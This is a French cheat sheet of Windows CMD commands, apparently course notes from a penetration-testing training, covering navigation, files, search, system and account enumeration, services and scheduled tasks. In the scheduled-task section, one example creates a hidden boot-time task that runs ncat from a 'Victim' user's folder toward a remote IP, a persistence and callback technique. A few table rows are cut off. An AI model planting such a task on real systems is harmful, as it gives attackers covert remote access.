### CMD

# 1) Démarrage & Aide

| Action | Commande | Notes / Exemples |
| --- | --- | --- |
| Ouvrir CMD local | `Win+R` → `cmd` | Exécutable : `C:\Windows\System32\cmd.exe` |
| Effacer l’écran | `cls` | — |
| Aide générale | `help` | Liste les built-ins |
| Aide d’une commande (built-in) | `help <commande>` | ex. `help time` |
| Aide (binaire non built-in) | `<commande> /?` | ex. `ipconfig /?` |
| Historique (liste) | `doskey /history` | L’historique n’est **pas persistant** |
| Interrompre un processus | `Ctrl+C` | Arrête la commande en cours |

**Raccourcis d’historique (extraits) :** ↑ / ↓ (parcourir), PageUp/PageDown (début/fin), **F3** (rétape tout le dernier), **F5** (cycle), **F7** (liste interactive), **F9** (par numéro).

---

# 2) Navigation & Enum basique

| Action | Commande | Notes / Exemples |
| --- | --- | --- |
| Lister le dossier courant | `dir` | `dir <chemin>` possible |
| Chemin courant | `cd` **(sans argument)** | alias `chdir` |
| Aller à un dossier | `cd <chemin>` | Absolu `C:\Users\htb\Pictures` / Relatif `cd .\Pictures` |
| Remonter | `cd ..` | `cd ..\..\..\` pour remonter plusieurs niveaux |
| Arborescence | `tree` | `/F` pour inclure les **fichiers** |
| Dossiers « intéressants » | `%SYSTEMROOT%\Temp`, `%TEMP%`, `%PUBLIC%`, `%ProgramFiles%`, `%ProgramFiles(x86)%` | Voir usages dans le cours |

---

# 3) Dossiers — créer, supprimer, déplacer, copier

| Action | Commande | Notes / Exemples |
| --- | --- | --- |
| Créer un dossier | `mkdir <nom>` | équivalent `md`, ex. `mkdir apples` |
| Supprimer un dossier vide | `rd <dossier>` | alias `rmdir` |
| Supprimer un dossier + contenu | `rd /S <dossier>` | Demande confirmation |
| Déplacer/Renommer dossier | `move <src> <dst>` | Déplace l’arbre |
| Copier (ancien) | `xcopy <src> <dst> /E` | Copie sous-dossiers (même vides). `/K` garde les attributs |
| Copier/Sync robuste | `robocopy <src> <dst>` | Options utiles : `/E`, `/MIR` (miroir, **supprime** dans dst), `/A-:SH` (retire System/Hidden), `/B` (Backup mode, nécessite droits) |

---

# 4) Fichiers — lister, lire, créer, modifier, supprimer

| Action | Commande | Notes / Exemples |
| --- | --- | --- |
| Lister fichiers | `dir` | — |
| Afficher contenu (page à page) | `more <fichier>` | `/S` compresse les lignes vides, pipeline : `commande |
| Afficher contenu simple | `type <fichier>` | Peut rediriger (`>>`, `>`) |
| Créer/ajouter texte | `echo <texte> > fichier` ; `>>` pour **ajouter** | — |
| Créer fichier (taille donnée) | `fsutil file createNew <f> <octets>` | Puis remplir au besoin |
| Renommer fichier | `ren <src> <dst>` | alias `rename` |
| Supprimer fichier(s) | `del <cible>` / `erase <cible>` | `/A:<attr>` cible par attribut (R,S,H,A,I,L,O ; `-` pour négation), `/F` force |
| Copier fichier | `copy <src> <dst> [/V]` | `/V` valide la copie |
| Déplacer fichier | `move <src> <dst>` | Renomme/déplace |

**Redirections & chaînages :**

- Sortie vers fichier : `>` (écrase), `>>` (append)
- Entrée depuis fichier : `<`
- Pipe : `|`
- Enchaîner sans condition : `A & B`
- Enchaîner si succès : `A && B`
- Enchaîner si échec : `A || B`

---

# 5) Recherche de fichiers & de texte

| Besoin | Commande | Exemple |
| --- | --- | --- |
| Trouver un exécutable/fichier dans PATH | `where <nom>` | `where calc.exe` |
| Recherche récursive dans un chemin | `where /R <chemin> <pat>` | `where /R C:\Users\student *.csv` |
| Chercher une **chaîne** dans fichier(s) | `find "texte" <fichier>` | Modifs : `/I` (ignore case), `/N` (numéros), `/V` (lignes **sans** le texte) |
| Chercher par **pattern / regex** | `findstr <options> <pat> <fichiers>` | (cmd « grep-like » du cours) |

---

# 6) Comparer & trier

| Action | Commande | Notes |
| --- | --- | --- |
| Comparer octet/ASCII | `comp f1 f2 [/A] [/L]` | Montre l’offset/char qui diffère |
| Comparer lignes | `fc f1 f2` | Options utiles : `/N` (numéro), `/B` (binaire), `/W` (ignore espaces), `/C` (ignore case) |
| Trier | `sort <fichier> /O <out>` | `/unique` pour uniques |

---

# 7) Infos Système & Réseau & Comptes

| Catégorie | Commande | Ce que ça donne |
| --- | --- | --- |
| Vue globale verbeuse | `systeminfo` | OS, build, hotfixes, etc. |
| Nom machine | `hostname` | — |
| Version OS | `ver` | — |
| Réseau (résumé / complet) | `ipconfig` / `ipconfig /all` | IP, masque, passerelle, MAC, DNS, DHCP… |
| Cache ARP | `arp /a` | Hôtes vus par interface |
| Contexte utilisateur | `whoami` | Domaine\Utilisateur |
| Privilèges | `whoami /priv` | Liste des privileges (Enabled/Disabled) |
| Groupes | `whoami /groups` | Groupes du compte courant |
| Comptes locaux | `net user` | Liste des users |
| Groupes locaux | `net localgroup` | Groupes de la machine |
| Partages de la machine | `net share` | C$, ADMIN$, IPC$, partages nommés |
| Découverte ressources | `net view` | Ressources connues |

---

# 8) Variables d’environnement

| Action | Commande | Exemple / Notes |
| --- | --- | --- |
| Afficher toutes / une variable | `set` / `echo %VAR%` | `echo %PATH%` |
| Définir (session courante) | `set VAR=valeur` | Scope **processus** (temporaire) |
| Définir (persistant) | `setx VAR valeur` | Écrit registre (visible au **prochain** shell) |
| Supprimer (persistant) | `setx VAR ""` | Puis rouvrir la session |
| Variables importantes (exemples) | `%PATH%`, `%OS%`, `%SYSTEMROOT%`, `%LOGONSERVER%`, `%USERPROFILE%`, `%ProgramFiles%`, `%ProgramFiles(x86)%` | — |

*Scopes (selon cours)* : **System/Machine (global)**, **User**, **Process**.

---

# 9) Services (SC) & autres vues

| Besoin | Commande | Exemple / Notes |
| --- | --- | --- |
| Aide SC | `sc` | Montre la syntaxe |
| Lister services actifs | `sc query type= service` | **Attention à l’espace** : `type= service` |
| Lister tout (services & drivers) | `sc query state= all` | — |
| Statut d’un service | `sc query <nom>` | ex. `sc query Spooler` |
| Démarrer / Arrêter | `sc start <nom>` / `sc stop <nom>` | `sc stop Spooler` |
| Modifier config | `sc config <nom> start= disabled` | ex. désactiver `wuauserv`, `bits` |
| Processus ↔ Services | `tasklist /svc` | PIDs et services hébergés |
| Services en cours | `net start` | (et `net stop/pause/continue`) |
| Liste brève (WMI) | `wmic service list brief` | **Déprécié** mais présent dans le cours |

---

# 10) Tâches planifiées (schtasks)

| Action | Commande (extrait de syntaxe vue) | Exemple |
| --- | --- | --- |
| Lister (verbeux, liste) | `schtasks /Query /V /FO LIST` | — |
| Créer | `schtasks /create /sc <schedule> /tn "<nom>" /tr "<action>"` | `... /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"` |
| Modifier | `schtasks /change /tn "<nom>" [ /ru <user> /rp <pass> | /ENABLE |
| Supprimer | `schtasks /delete /tn "<nom>" [/F]` | `/F` supprime sans confirmer |
| Exécuter maintenant | `schtasks /run /tn "<nom>"` | (mentionné implicitement) |

**Déclencheurs (cours)** : au boot, à l’ouverture de session, à heure donnée (min/heure/jour/semaine/mois), à l’idle, à l’enregistrement, sur événements, etc.
